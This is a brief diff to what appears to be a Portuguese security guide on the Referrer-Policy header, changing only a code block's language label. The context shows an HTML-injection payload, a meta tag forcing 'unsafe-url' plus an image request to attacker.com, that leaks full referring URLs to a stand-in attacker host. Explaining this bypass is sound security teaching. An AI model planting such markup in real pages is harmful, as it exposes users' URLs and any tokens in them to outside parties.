@@ -24,7 +24,7 @@ Referrer-Policy: unsafe-url
 ## Contra-Mitigação
 
 Você pode substituir esta regra usando uma tag meta HTML (o atacante precisa explorar uma injeção HTML):
-```markup
+```html
 <meta name="referrer" content="unsafe-url">
 <img src="https://attacker.com">
 ```
